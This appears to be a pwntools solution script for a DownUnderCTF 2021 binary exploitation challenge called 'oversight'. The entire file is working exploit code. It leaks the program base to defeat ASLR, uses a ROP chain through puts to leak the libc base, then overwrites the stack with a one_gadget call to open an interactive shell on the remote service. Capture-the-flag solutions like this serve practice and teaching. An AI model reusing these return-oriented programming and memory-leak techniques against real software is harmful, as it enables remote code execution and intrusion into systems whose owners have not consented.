from pwn import *

r = remote('pwn-2021.duc.tf', 31909)
# r = process('./oversight', env={'LD_PRELOAD':'./libc-2.27.so'})
context.arch = 'x86_64'
context.log_level = 'debug'
libc = ELF('./libc-2.27.so')
bin = ELF('./oversight')

r.sendlineafter(b'enter to continue\n', b'')
r.sendlineafter(b'Pick a number: ', b'25')
r.recvuntil(b'number is: ')

bin.address = int(b'0x' + r.recv(12), 16) - 0x10d5
log.success('ASLR: %#x' % bin.address)
r.sendlineafter(b'you want to read (max 256)? ', b'256')

pop_rdi_ret = 0x0000000000001493 + bin.address
puts_got = 0x4018 + bin.address
puts_plt = 0x1030 + bin.address
fgets_plt = 0x1080 + bin.address
main = 0x10b0 + bin.address
pop_rcx = 0x0000000000034da3


payload = b'a'*8 + (p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)) * 0x7
r.sendline(payload.ljust(0x100, b'a'))
r.recvuntil(b'You said:\n')
r.recvuntil((bin.address + 0x1493).to_bytes(6, 'little'))

libc.address = u64(r.recv(6).ljust(8, b'\x00')) - libc.symbols['puts']
log.success('Libc base: %#x' % libc.address)

# gdb.attach(r, '''
#     b*get_num_bytes+81
# ''')
r.sendlineafter(b'Pick a number: ', b'24')
r.recvuntil(b'number is: ')

stack = int(b'0x' + r.recv(12), 16) - 0x200
log.success('Stack: %#x' % stack)
r.sendlineafter(b'you want to read (max 256)? ', b'256')

offset = ((stack + 0x100) & 0xffffffffffffff00) - stack + 8
log.info('Offset: %#x' % offset)
payload = b'a'*offset + p64(pop_rcx + libc.address) + p64(0) + p64(libc.address + 0x4f3d5)
r.sendline(payload.ljust(0x100, b'\x00'))
r.interactive()